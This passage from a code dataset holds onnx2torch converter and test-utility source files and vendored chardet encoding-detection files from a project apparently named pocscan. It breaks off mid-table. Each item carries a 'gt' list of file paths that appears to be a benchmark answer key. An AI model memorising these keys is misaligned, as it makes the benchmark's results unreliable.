        "content": "'onnx2torch/onnx2torch/node_converters/functions.py'\n:__all__ = [\n    'OnnxFunction',\n]\n\nimport torch\nfrom torch import nn\n\nfrom onnx2torch.node_converters.registry import add_converter\nfrom onnx2torch.onnx_graph import OnnxGraph\nfrom onnx2torch.onnx_node import OnnxNode\nfrom onnx2torch.utils.common import OnnxToTorchModule\nfrom onnx2torch.utils.common import OperationConverterResult\nfrom onnx2torch.utils.common import onnx_mapping_from_node\n\n\n_TORCH_FUNCTION_FROM_ONNX_TYPE = {\n    'Abs': torch.abs,\n    'Acos': torch.acos,\n    'Asin': torch.asin,\n    'Atan': torch.atan,\n    'Cos': torch.cos,\n    'Exp': torch.exp,\n    'Log': torch.log,\n    'Sign': torch.sign,\n    'Sin': torch.sin,\n    'Tan': torch.tan,\n    'Tanh': torch.tanh,\n}\n\n\nclass OnnxFunction(nn.Module, OnnxToTorchModule):\n    def __init__(self, function_type: str):\n        super().__init__()\n        self.function = _TORCH_FUNCTION_FROM_ONNX_TYPE[function_type]\n\n    def forward(self, input_tensor: torch.Tensor) -> torch.Tensor:\n        return self.function(input_tensor)\n\n\n@add_converter(operation_type='Abs', version=13)\n@add_converter(operation_type='Abs', version=6)\n@add_converter(operation_type='Acos', version=7)\n@add_converter(operation_type='Asin', version=7)\n@add_converter(operation_type='Atan', version=7)\n@add_converter(operation_type='Cos', version=7)\n@add_converter(operation_type='Exp', version=6)\n@add_converter(operation_type='Exp', version=13)\n@add_converter(operation_type='Log', version=13)\n@add_converter(operation_type='Log', version=6)\n@add_converter(operation_type='Sign', version=13)\n@add_converter(operation_type='Sign', version=9)\n@add_converter(operation_type='Sin', version=7)\n@add_converter(operation_type='Tan', version=7)\n@add_converter(operation_type='Tanh', version=13)\n@add_converter(operation_type='Tanh', version=6)\ndef _(node: OnnxNode, graph: OnnxGraph) -> OperationConverterResult:\n    return OperationConverterResult(\n        torch_module=OnnxFunction(node.operation_type),\n        onnx_mapping=onnx_mapping_from_node(node=node),\n    )\n\n'onnx2torch/onnx2torch/node_converters/__init__.py'\n:from onnx2torch.node_converters.activations import *\nfrom onnx2torch.node_converters.average_pool import *\nfrom onnx2torch.node_converters.batch_norm import *\nfrom onnx2torch.node_converters.binary_math_operations import *\nfrom onnx2torch.node_converters.cast import *\nfrom onnx2torch.node_converters.clip import *\nfrom onnx2torch.node_converters.comparisons import *\nfrom onnx2torch.node_converters.concat import *\nfrom onnx2torch.node_converters.constant import *\nfrom onnx2torch.node_converters.constant_of_shape import *\nfrom onnx2torch.node_converters.conv import *\nfrom onnx2torch.node_converters.cumsum import *\nfrom onnx2torch.node_converters.depth_to_space import *\nfrom onnx2torch.node_converters.dropout import *\nfrom onnx2torch.node_converters.einsum import *\nfrom onnx2torch.node_converters.expand import *\nfrom onnx2torch.node_converters.eye_like import *\nfrom onnx2torch.node_converters.flatten import *\nfrom onnx2torch.node_converters.functions import *\nfrom onnx2torch.node_converters.gather import *\nfrom onnx2torch.node_converters.gemm import *\nfrom onnx2torch.node_converters.global_average_pool import *\nfrom onnx2torch.node_converters.identity import *\nfrom onnx2torch.node_converters.instance_norm import *\nfrom onnx2torch.node_converters.isinf import *\nfrom onnx2torch.node_converters.isnan import *\nfrom onnx2torch.node_converters.layer_norm import *\nfrom onnx2torch.node_converters.logical import *\nfrom onnx2torch.node_converters.lrn import *\nfrom onnx2torch.node_converters.matmul import *\nfrom onnx2torch.node_converters.max_pool import *\nfrom onnx2torch.node_converters.mean import *\nfrom onnx2torch.node_converters.min_max import *\nfrom onnx2torch.node_converters.mod import *\nfrom onnx2torch.node_converters.neg import *\nfrom onnx2torch.node_converters.nms import *\nfrom onnx2torch.node_converters.nonzero import *\nfrom onnx2torch.node_converters.pad import *\nfrom onnx2torch.node_converters.pow import *\nfrom onnx2torch.node_converters.range import *\nfrom onnx2torch.node_converters.reciprocal import *\nfrom onnx2torch.node_converters.reduce import *\nfrom onnx2torch.node_converters.registry import OperationDescription\nfrom onnx2torch.node_converters.registry import TConverter\nfrom onnx2torch.node_converters.registry import get_converter\nfrom onnx2torch.node_converters.reshape import *\nfrom onnx2torch.node_converters.resize import *\nfrom onnx2torch.node_converters.roialign import *\nfrom onnx2torch.node_converters.roundings import *\nfrom onnx2torch.node_converters.scatter_nd import *\nfrom onnx2torch.node_converters.shape import *\nfrom onnx2torch.node_converters.slice import *\nfrom onnx2torch.node_converters.split import *\nfrom onnx2torch.node_converters.squeeze import *\nfrom onnx2torch.node_converters.sum import *\nfrom onnx2torch.node_converters.tile import *\nfrom onnx2torch.node_converters.topk import *\nfrom onnx2torch.node_converters.transpose import *\nfrom onnx2torch.node_converters.unsqueeze import *\nfrom onnx2torch.node_converters.where import *\n\n'onnx2torch/tests/node_converters/min_max_test.py'\n:from typing import List\n\nimport numpy as np\nimport onnx\nimport pytest\nfrom onnx.helper import make_tensor_value_info\nfrom onnx.mapping import NP_TYPE_TO_TENSOR_TYPE\n\nfrom tests.utils.common import check_onnx_model\nfrom tests.utils.common import make_model_from_nodes\n\n\ndef _test_min_max(\n    data_list: List[np.ndarray],\n    operation_type: str,\n) -> None:\n    test_inputs = {f'data_{i}': data for i, data in enumerate(data_list)}\n\n    node = onnx.helper.make_node(op_type=operation_type, inputs=list(test_inputs), outputs=['y'])\n    outputs_info = [\n        make_tensor_value_info(\n            name='y',\n            elem_type=NP_TYPE_TO_TENSOR_TYPE[data_list[0].dtype],\n            shape=None,\n        ),\n    ]\n\n    model = make_model_from_nodes(\n        nodes=node,\n        initializers={},\n        inputs_example=test_inputs,\n        outputs_info=outputs_info,\n    )\n    check_onnx_model(model, test_inputs)\n\n\n@pytest.mark.parametrize(\n    'input_shapes',\n    (\n        ([],),\n        ([2, 3, 4],),\n        ([3, 1], [2, 1, 6]),\n        ([3, 1], [3, 4]),\n    ),\n)\n@pytest.mark.parametrize('operation_type', ['Min', 'Max'])\ndef test_min_amx(\n    input_shapes: List[List[int]],\n    operation_type: str,\n) -> None:\n    input_tensors = [np.random.normal(size=i_shape).astype(np.float32) for i_shape in input_shapes]\n\n    _test_min_max(\n        data_list=input_tensors,\n        operation_type=operation_type,\n    )\n\n'onnx2torch/tests/utils/common.py'\n:import io\nfrom typing import Any\nfrom typing import Callable\nfrom typing import Dict\nfrom typing import List\nfrom typing import Optional\nfrom typing import Sequence\nfrom typing import Tuple\nfrom typing import Type\nfrom typing import Union\n\nimport numpy as np\nimport onnx\nimport onnxruntime as ort\nimport torch\nfrom onnx import defs\nfrom onnx import numpy_helper\nfrom onnx.helper import make_graph\nfrom onnx.helper import make_model\nfrom onnx.helper import make_operatorsetid\nfrom onnx.helper import make_tensor_value_info\nfrom onnx.mapping import NP_TYPE_TO_TENSOR_TYPE\nfrom onnx.onnx_ml_pb2 import ModelProto\nfrom onnx.onnx_ml_pb2 import NodeProto\nfrom onnx.onnx_ml_pb2 import ValueInfoProto\nfrom onnx.shape_inference import infer_shapes\n\nfrom onnx2torch.converter import convert\n\ntry:\n    from torch.onnx import CheckerError\nexcept ImportError:\n\n    class CheckerError(Exception):\n\n\n\ndef make_model_from_nodes(\n    nodes: Union[NodeProto, Sequence[NodeProto]],\n    initializers: Dict[str, np.ndarray],\n    inputs_example: Optional[Dict[str, np.ndarray]] = None,\n    inputs_info: Optional[Sequence[ValueInfoProto]] = None,\n    outputs_info: Optional[Sequence[ValueInfoProto]] = None,\n    opset_version: Optional[int] = 11,\n) -> ModelProto:\n    if inputs_info is None and inputs_example is None:\n        raise ValueError('inputs_example or inputs_info must be set')\n\n    if inputs_info is None:\n        inputs_info = []\n        for name, data in inputs_example.items():\n            elem_type = NP_TYPE_TO_TENSOR_TYPE[data.dtype]\n            inputs_info.append(make_tensor_value_info(name=name, elem_type=elem_type, shape=data.shape))\n\n    if outputs_info is None:\n        outputs_info = []\n        elem_type = inputs_info[0].type.tensor_type.elem_type\n        for name in tuple(nodes.output):\n            output_proto = make_tensor_value_info(name=name, elem_type=elem_type, shape=None)\n            outputs_info.append(output_proto)\n\n    graph_proto = make_graph(\n        nodes=(nodes,),\n        name='test_graph',\n        inputs=inputs_info,\n        outputs=outputs_info,\n        initializer=[numpy_helper.from_array(data, name=name) for name, data in initializers.items()],\n    )\n\n    opset_imports = None\n    if opset_version is not None:\n        opset_imports = [\n            make_operatorsetid(\n                domain=defs.ONNX_DOMAIN,\n                version=opset_version,\n            ),\n        ]\n\n    model = make_model(graph_proto, opset_imports=opset_imports)\n    model = infer_shapes(model, check_type=False)\n    onnx.checker.check_model(model, False)\n\n    return model\n\n\ndef _convert_data(data: Any, from_type: Type, convert_function: Callable) -> Any:\n    if isinstance(data, Dict):\n        return {k: _convert_data(v, from_type, convert_function) for k, v in data.items()}\n\n    if isinstance(data, (Tuple, List)):\n        return type(data)(_convert_data(v, from_type, convert_function) for v in data)\n\n    if isinstance(data, from_type):\n        return convert_function(data)\n\n    return data\n\n\ndef convert_data_onnx2torch(data: Any, device: str = 'cpu') -> Any:\n    def convert_function(z):\n        return torch.from_numpy(z).to(device=device)\n\n    return _convert_data(data, from_type=np.ndarray, convert_function=convert_function)\n\n\ndef convert_data_torch2onnx(data: Any) -> Any:\n    def convert_function(z):\n        return z.detach().cpu().numpy()\n\n    return _convert_data(data, from_type=torch.Tensor, convert_function=convert_function)\n\n\ndef convert_onnx_inputs_to_torch_inputs(\n    onnx_model: ModelProto,\n    onnx_inputs: Dict[str, Any],\n    device: str = 'cpu',\n) -> List[Any]:\n    return [\n        convert_data_onnx2torch(onnx_inputs[graph_input.name], device=device)\n        for graph_input in onnx_model.graph.input\n        if graph_input.name in onnx_inputs\n    ]\n\n\ndef calc_ort_outputs(\n    model: ModelProto,\n    inputs: Dict[str, Any],\n    skip_unused_inputs: bool = False,\n) -> List[Any]:\n    ort_session = ort.InferenceSession(\n        model.SerializeToString(),\n        providers=['CPUExecutionProvider'],\n    )\n\n    if skip_unused_inputs:\n        graph_inputs = [i.name for i in model.graph.input]\n        inputs = {k: v for k, v in inputs.items() if k in graph_inputs}\n\n    outputs = ort_session.run(\n        output_names=None,\n        input_feed=inputs,\n    )\n\n    return outputs\n\n\ndef calc_torch_outputs(\n    model: ModelProto,\n    inputs: Dict[str, Any],\n    device: str = 'cpu',\n) -> Any:\n    inputs = convert_onnx_inputs_to_torch_inputs(onnx_model=model, onnx_inputs=inputs, device=device)\n    model = convert(model)\n    model = model.eval()\n    model = model.to(device=device)\n    outputs = model(*inputs)\n\n    return convert_data_torch2onnx(outputs)\n\n\ndef calc_torch_and_ort_outputs(\n    model: ModelProto,\n    test_inputs: Dict[str, np.ndarray],\n):\n    torch_outputs = calc_torch_outputs(model=model, inputs=test_inputs)\n    ort_outputs = calc_ort_outputs(model=model, inputs=test_inputs)\n\n    return torch_outputs, ort_outputs\n\n\ndef convert_onnx2torch2onnx(\n    model: ModelProto,\n    inputs: Dict[str, np.ndarray],\n    opset_version: int = 13,\n    ignore_export_checker: bool = False,\n    **export_kwargs,\n) -> ModelProto:\n    torch_model = convert(model)\n    input_names = list(inputs.keys())\n    args = list(inputs.values())\n    args = tuple(torch.tensor(arg) for arg in args)\n\n    with io.BytesIO() as tmp_file:\n        try:\n            torch.onnx.export(\n                model=torch_model,\n                args=args,\n                f=tmp_file,\n                input_names=input_names,\n                opset_version=opset_version,\n                **export_kwargs,\n            )\n        except CheckerError:\n            if not ignore_export_checker:\n                raise\n\n        return onnx.load_from_string(tmp_file.getvalue())\n\n\ndef _check_onnx_model(\n    onnx_model: ModelProto,\n    onnx_inputs: Dict[str, Any],\n    onnx_torch_check_function: Callable,\n    torch_cpu_cuda_check_function: Optional[Callable] = None,\n    onnx_torch2onnx_check_function: Optional[Callable] = None,\n    ignore_export_checker: bool = False,\n    opset_version: int = 13,\n) -> None:\n    ort_outputs = calc_ort_outputs(onnx_model, onnx_inputs)\n    torch_outputs = calc_torch_outputs(onnx_model, onnx_inputs, device='cpu')\n\n    onnx_torch_check_function(ort_outputs, torch_outputs)\n\n    if torch_cpu_cuda_check_function is not None:\n        torch_cuda_outputs = calc_torch_outputs(onnx_model, onnx_inputs, device='cuda')\n        torch_cpu_cuda_check_function(torch_outputs, torch_cuda_outputs)\n\n    if onnx_torch2onnx_check_function is not None:\n        torch2onnx_model = convert_onnx2torch2onnx(\n            onnx_model,\n            inputs=onnx_inputs,\n            ignore_export_checker=ignore_export_checker,\n            opset_version=opset_version,\n        )\n        ort_torch2onnx_outputs = calc_ort_outputs(torch2onnx_model, onnx_inputs, skip_unused_inputs=True)\n        onnx_torch2onnx_check_function(ort_outputs, ort_torch2onnx_outputs)\n\n\ndef check_onnx_model(\n    onnx_model: ModelProto,\n    onnx_inputs: Dict[str, Any],\n    atol_onnx_torch: float = 0.0,\n    atol_torch_cpu_cuda: float = 0.0,\n    atol_onnx_torch2onnx: float = 0.0,\n    ignore_export_checker: bool = False,\n    opset_version: int = 13,\n) -> None:\n    def onnx_torch_check_function(onnx_output, torch_output):\n        if len(onnx_output) == 1:\n            torch_output = [torch_output]\n\n        for x, y in zip(onnx_output, torch_output):\n            assert np.all(np.isclose(x, y, atol=atol_onnx_torch)), 'ort and torch outputs have significant difference'\n\n    def torch_cpu_cuda_check_function(\n        torch_cpu_output,\n        torch_cuda_output,\n    ):\n        if not isinstance(torch_cpu_output, (List, Tuple)):\n            torch_cpu_output = [torch_cpu_output]\n            torch_cuda_output = [torch_cuda_output]\n\n        for x, y in zip(torch_cpu_output, torch_cuda_output):\n            assert np.all(\n                np.isclose(x, y, atol=atol_torch_cpu_cuda)\n            ), 'torch cpu and torch cuda outputs have significant difference'\n\n        return True\n\n    def onnx_torch2onnx_check_function(onnx_output, torch2onnx_output):\n        for x, y in zip(onnx_output, torch2onnx_output):\n            assert np.all(\n                np.isclose(x, y, atol=atol_onnx_torch2onnx)\n            ), 'ort and ort+torch2onnx outputs have significant difference'\n\n        return True\n\n    _check_onnx_model(\n        onnx_model=onnx_model,\n        onnx_inputs=onnx_inputs,\n        onnx_torch_check_function=onnx_torch_check_function,\n        torch_cpu_cuda_check_function=torch_cpu_cuda_check_function,\n        onnx_torch2onnx_check_function=onnx_torch2onnx_check_function,\n        ignore_export_checker=ignore_export_checker,\n        opset_version=opset_version,\n    )\n\n\ndef check_torch_model(\n    torch_model: torch.nn.Module,\n    onnx_inputs: Dict[str, Any],\n    atol_onnx_torch: float = 0.0,\n    atol_torch_cpu_cuda: float = 0.0,\n    atol_onnx_torch2onnx: float = 0.0,\n    opset_version: int = 13,\n) -> None:\n    arguments = locals()\n    input_names = list(onnx_inputs.keys())\n    args = tuple(torch.tensor(arg) for arg in onnx_inputs.values())\n\n    with io.BytesIO() as tmp_file:\n        torch.onnx.export(\n            model=torch_model,\n            args=args,\n            f=tmp_file,\n            input_names=input_names,\n            opset_version=opset_version,\n        )\n\n        arguments.pop('torch_model')\n        arguments['onnx_model'] = onnx.load_from_string(tmp_file.getvalue())\n        check_onnx_model(**arguments)\n\n'onnx2torch/onnx2torch/converter.py'\n:import inspect\nfrom collections import OrderedDict\nfrom operator import getitem\nfrom pathlib import Path\nfrom typing import Union\n\nimport torch\nfrom onnx.onnx_ml_pb2 import ModelProto\nfrom torch import fx\nfrom torch import nn\n\nfrom onnx2torch.node_converters import get_converter\nfrom onnx2torch.onnx_graph import OnnxGraph\nfrom onnx2torch.onnx_graph import ValueType\nfrom onnx2torch.utils.safe_shape_inference import safe_shape_inference\n\n\ndef _remove_initializers_from_input(model: ModelProto) -> ModelProto:\n    graph_inputs = model.graph.input\n    graph_inputs_mapping = {one_input.name: one_input for one_input in graph_inputs}\n\n    for initializer in model.graph.initializer:\n        if initializer.name in graph_inputs_mapping:\n            graph_inputs.remove(graph_inputs_mapping[initializer.name])\n\n    return model\n\n\nclass InitializersContainer(nn.Module):\n\n\n    def add_initializer(self, name: str, initializer: torch.Tensor) -> None:\n        self.register_buffer(name, initializer)\n\n    def forward(self, *args, **kwargs):\n        raise RuntimeError('Got unexpected \"forward\" on constant container')\n\n\ndef convert(\n    onnx_model_or_path: Union[str, Path, ModelProto],\n    save_input_names: bool = False,\n    attach_onnx_mapping: bool = False,\n) -> fx.GraphModule:\n\n\n    onnx_model = safe_shape_inference(onnx_model_or_path)\n\n    if onnx_model.ir_version < 3:\n        raise NotImplementedError('Onnx IR is too old (minimal supported version is 3).')\n\n    onnx_model = _remove_initializers_from_input(onnx_model)\n    opset_import = {opsetid_proto.domain: opsetid_proto.version for opsetid_proto in onnx_model.opset_import}\n\n    onnx_graph = OnnxGraph(onnx_model.graph)\n    torch_graph = fx.Graph()\n\n    torch_initializers = InitializersContainer()\n    torch_modules = nn.Module()\n    torch_modules.add_module('initializers', torch_initializers)\n    torch_nodes = {}\n\n\n    for input_value, name in enumerate(onnx_graph.input_values, 1):\n        if save_input_names:\n            if not name.isidentifier():\n                raise ValueError(f'Input name \"{name}\" cannot be used as name of placeholder in fx.GraphModule.')\n\n            placeholder_name = name\n        else:\n            placeholder_name = f'input_{input_value}'\n\n        torch_nodes[name] = torch_graph.placeholder(name=placeholder_name)\n\n\n\n    for name, onnx_node in onnx_graph.nodes.items():\n        version = opset_import[onnx_node.domain]\n        converter = get_converter(\n            domain=onnx_node.domain,\n            operation_type=onnx_node.operation_type,\n            version=version,\n        )\n\n        torch_module, onnx_mapping = converter(onnx_node, onnx_graph)\n        if attach_onnx_mapping:\n            setattr(torch_module, 'onnx_mapping', onnx_mapping)\n\n        torch_modules.add_module(name, torch_module)\n\n        args = []\n        for value_name in onnx_mapping.inputs:\n            value_type = onnx_graph.value_type(value_name)\n            if value_type == ValueType.GRAPH_INPUT:\n                args.append(torch_nodes[value_name])\n\n            elif value_type == ValueType.NODE_OUTPUT:\n                onnx_input_node, _ = onnx_graph.value_as_node_output(value_name)\n                torch_input_node = torch_nodes[onnx_input_node.unique_name]\n\n\n                if len(onnx_input_node.output_values) > 1:\n                    index = onnx_input_node.output_values.index(value_name)\n                    torch_input_node = torch_graph.call_function(getitem, args=(torch_input_node, index))\n                    torch_nodes[name + '_split_output'] = torch_input_node\n                args.append(torch_input_node)\n\n            elif value_type == ValueType.GRAPH_INITIALIZER:\n\n                len_torch_initializers = sum(1 for _ in torch_initializers.buffers())\n                torch_buffer_name = f'onnx_initializer_{len_torch_initializers}'\n                if value_name not in torch_nodes:\n                    torch_initializers.add_initializer(\n                        torch_buffer_name,\n                        onnx_graph.initializers[value_name].to_torch(),\n                    )\n                    torch_nodes[torch_buffer_name] = torch_graph.get_attr(f'initializers.{torch_buffer_name}')\n                args.append(torch_nodes[torch_buffer_name])\n\n            elif value_type == ValueType.EMPTY:\n                args.append(None)\n\n            else:\n                raise RuntimeError(f'Got unexpected input value type ({value_type})')\n\n\n        kwargs = {}\n        if None in args:\n            first_skipped_arg = args.index(None)\n            forward_args = tuple(inspect.signature(torch_module.forward).parameters.keys())\n            forward_args = forward_args[first_skipped_arg : len(args)]\n            args, kwargs_values = args[:first_skipped_arg], args[first_skipped_arg:]\n            kwargs.update({name: value for name, value in zip(forward_args, kwargs_values) if value is not None})\n\n        torch_nodes[name] = torch_graph.call_module(module_name=name, args=tuple(args), kwargs=kwargs)\n\n\n    onnx_output_nodes = [onnx_graph.value_as_node_output(value_name)[0] for value_name in onnx_graph.output_values]\n\n    onnx_output_nodes = list(OrderedDict.fromkeys(onnx_output_nodes))\n\n    torch_output_nodes = [torch_nodes[onnx_node.unique_name] for onnx_node in onnx_output_nodes]\n    if len(torch_output_nodes) == 1:\n        torch_output_nodes = torch_output_nodes[0]\n    torch_graph.output(torch_output_nodes)\n\n    torch_graph.lint()\n    torch_model = fx.GraphModule(root=torch_modules, graph=torch_graph)\n\n    return torch_model\n",
        "gt": [
            "'onnx2torch/onnx2torch/node_converters/functions.py'",
            "'onnx2torch/onnx2torch/node_converters/__init__.py'",
            "'onnx2torch/onnx2torch/converter.py'",
            "'onnx2torch/tests/utils/common.py'",
            "'onnx2torch/tests/node_converters/min_max_test.py'"
        ]
    },
    {
        "files": [
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/chardetect.py'",
            "'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/sbcsgroupprober.py'",
            "'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/universaldetector.py'",
            "'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/langbulgarianmodel.py'"
        ],
        "content": "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/chardetect.py'\n:\n\nfrom io import open\nfrom sys import argv, stdin\n\nfrom chardet.universaldetector import UniversalDetector\n\n\ndef description_of(file, name='stdin'):\n\n    u = UniversalDetector()\n    for line in file:\n        u.feed(line)\n    u.close()\n    result = u.result\n    if result['encoding']:\n        return '%s: %s with confidence %s' % (name,\n                                              result['encoding'],\n                                              result['confidence'])\n    else:\n        return '%s: no result' % name\n\n\ndef main():\n    if len(argv) <= 1:\n        print(description_of(stdin))\n    else:\n        for path in argv[1:]:\n            with open(path, 'rb') as f:\n                print(description_of(f, path))\n\n\nif __name__ == '__main__':\n    main()\n\n'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/sbcsgroupprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .sbcharsetprober import SingleByteCharSetProber\nfrom .langcyrillicmodel import (Win1251CyrillicModel, Koi8rModel,\n                                Latin5CyrillicModel, MacCyrillicModel,\n                                Ibm866Model, Ibm855Model)\nfrom .langgreekmodel import Latin7GreekModel, Win1253GreekModel\nfrom .langbulgarianmodel import Latin5BulgarianModel, Win1251BulgarianModel\nfrom .langhungarianmodel import Latin2HungarianModel, Win1250HungarianModel\nfrom .langthaimodel import TIS620ThaiModel\nfrom .langhebrewmodel import Win1255HebrewModel\nfrom .hebrewprober import HebrewProber\n\n\nclass SBCSGroupProber(CharSetGroupProber):\n    def __init__(self):\n        CharSetGroupProber.__init__(self)\n        self._mProbers = [\n            SingleByteCharSetProber(Win1251CyrillicModel),\n            SingleByteCharSetProber(Koi8rModel),\n            SingleByteCharSetProber(Latin5CyrillicModel),\n            SingleByteCharSetProber(MacCyrillicModel),\n            SingleByteCharSetProber(Ibm866Model),\n            SingleByteCharSetProber(Ibm855Model),\n            SingleByteCharSetProber(Latin7GreekModel),\n            SingleByteCharSetProber(Win1253GreekModel),\n            SingleByteCharSetProber(Latin5BulgarianModel),\n            SingleByteCharSetProber(Win1251BulgarianModel),\n            SingleByteCharSetProber(Latin2HungarianModel),\n            SingleByteCharSetProber(Win1250HungarianModel),\n            SingleByteCharSetProber(TIS620ThaiModel),\n        ]\n        hebrewProber = HebrewProber()\n        logicalHebrewProber = SingleByteCharSetProber(Win1255HebrewModel,\n                                                      False, hebrewProber)\n        visualHebrewProber = SingleByteCharSetProber(Win1255HebrewModel, True,\n                                                     hebrewProber)\n        hebrewProber.set_model_probers(logicalHebrewProber, visualHebrewProber)\n        self._mProbers.extend([hebrewProber, logicalHebrewProber,\n                               visualHebrewProber])\n\n        self.reset()\n\n'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/universaldetector.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nimport sys\nimport codecs\nfrom .latin1prober import Latin1Prober\nfrom .mbcsgroupprober import MBCSGroupProber\nfrom .sbcsgroupprober import SBCSGroupProber\nfrom .escprober import EscCharSetProber\nimport re\n\nMINIMUM_THRESHOLD = 0.20\nePureAscii = 0\neEscAscii = 1\neHighbyte = 2\n\n\nclass UniversalDetector:\n    def __init__(self):\n        self._highBitDetector = re.compile(b'[\\x80-\\xFF]')\n        self._escDetector = re.compile(b'(\\033|~{)')\n        self._mEscCharSetProber = None\n        self._mCharSetProbers = []\n        self.reset()\n\n    def reset(self):\n        self.result = {'encoding': None, 'confidence': 0.0}\n        self.done = False\n        self._mStart = True\n        self._mGotData = False\n        self._mInputState = ePureAscii\n        self._mLastChar = b''\n        if self._mEscCharSetProber:\n            self._mEscCharSetProber.reset()\n        for prober in self._mCharSetProbers:\n            prober.reset()\n\n    def feed(self, aBuf):\n        if self.done:\n            return\n\n        aLen = len(aBuf)\n        if not aLen:\n            return\n\n        if not self._mGotData:\n\n            if aBuf[:3] == codecs.BOM:\n\n                self.result = {'encoding': \"UTF-8\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_LE:\n\n                self.result = {'encoding': \"UTF-32LE\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_BE:\n\n                self.result = {'encoding': \"UTF-32BE\", 'confidence': 1.0}\n            elif aBuf[:4] == b'\\xFE\\xFF\\x00\\x00':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-3412\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:4] == b'\\x00\\x00\\xFF\\xFE':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-2143\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:2] == codecs.BOM_LE:\n\n                self.result = {'encoding': \"UTF-16LE\", 'confidence': 1.0}\n            elif aBuf[:2] == codecs.BOM_BE:\n\n                self.result = {'encoding': \"UTF-16BE\", 'confidence': 1.0}\n\n        self._mGotData = True\n        if self.result['encoding'] and (self.result['confidence'] > 0.0):\n            self.done = True\n            return\n\n        if self._mInputState == ePureAscii:\n            if self._highBitDetector.search(aBuf):\n                self._mInputState = eHighbyte\n            elif ((self._mInputState == ePureAscii) and\n                    self._escDetector.search(self._mLastChar + aBuf)):\n                self._mInputState = eEscAscii\n\n        self._mLastChar = aBuf[-1:]\n\n        if self._mInputState == eEscAscii:\n            if not self._mEscCharSetProber:\n                self._mEscCharSetProber = EscCharSetProber()\n            if self._mEscCharSetProber.feed(aBuf) == constants.eFoundIt:\n                self.result = {'encoding': self._mEscCharSetProber.get_charset_name(),\n                               'confidence': self._mEscCharSetProber.get_confidence()}\n                self.done = True\n        elif self._mInputState == eHighbyte:\n            if not self._mCharSetProbers:\n                self._mCharSetProbers = [MBCSGroupProber(), SBCSGroupProber(),\n                                         Latin1Prober()]\n            for prober in self._mCharSetProbers:\n                if prober.feed(aBuf) == constants.eFoundIt:\n                    self.result = {'encoding': prober.get_charset_name(),\n                                   'confidence': prober.get_confidence()}\n                    self.done = True\n                    break\n\n    def close(self):\n        if self.done:\n            return\n        if not self._mGotData:\n            if constants._debug:\n                sys.stderr.write('no data received!\\n')\n            return\n        self.done = True\n\n        if self._mInputState == ePureAscii:\n            self.result = {'encoding': 'ascii', 'confidence': 1.0}\n            return self.result\n\n        if self._mInputState == eHighbyte:\n            proberConfidence = None\n            maxProberConfidence = 0.0\n            maxProber = None\n            for prober in self._mCharSetProbers:\n                if not prober:\n                    continue\n                proberConfidence = prober.get_confidence()\n                if proberConfidence > maxProberConfidence:\n                    maxProberConfidence = proberConfidence\n                    maxProber = prober\n            if maxProber and (maxProberConfidence > MINIMUM_THRESHOLD):\n                self.result = {'encoding': maxProber.get_charset_name(),\n                               'confidence': maxProber.get_confidence()}\n                return self.result\n\n        if constants._debug:\n            sys.stderr.write('no probers hit minimum threshhold\\n')\n            for prober in self._mCharSetProbers[0].mProbers:\n                if not prober:\n                    continue\n                sys.stderr.write('%s confidence = %s\\n' %\n                                 (prober.get_charset_name(),\n                                  prober.get_confidence()))\n\n'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/langbulgarianmodel.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLatin5_BulgarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,\n253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,\n110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,\n253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,\n116,195, 85, 93, 97,113,196,197,198,199,200,253,253,253,253,253,\n194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,\n210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,\n 81,226,227,228,229,230,105,231,232,233,234,235,236, 45,237,238,\n 31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,\n 39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,239, 67,240, 60, 56,\n  1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,\n  7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,241, 42, 16,\n 62,242,243,244, 58,245, 98,246,247,248,249,250,251, 91,252,253,\n)\n\nwin1251BulgarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,\n253, 77, 90, 99,100, 72,109,107,101, 79,185, 81,102, 76, 94, 82,\n110,186,108, 91, 74,119, 84, 96,111,187,115,253,253,253,253,253,\n253, 65, 69, 70, 66, 63, 68,112,103, 92,194,104, 95, 86, 87, 71,\n116,195, 85, 93, 